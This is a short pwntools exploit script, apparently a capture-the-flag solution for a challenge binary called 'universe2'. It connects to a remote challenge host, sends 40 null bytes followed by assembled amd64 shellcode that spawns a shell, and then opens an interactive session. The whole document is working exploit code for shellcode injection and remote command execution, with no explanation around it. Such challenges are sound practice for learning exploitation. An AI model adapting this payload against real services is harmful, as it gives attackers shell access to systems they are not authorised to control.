from pwn import *

context.arch = 'amd64'

#sh = process("./universe2")
sh = remote("challenge.bugpwn.com",1006)
sh.sendline(b'\x00'*40 + asm(shellcraft.sh()))

sh.interactive()
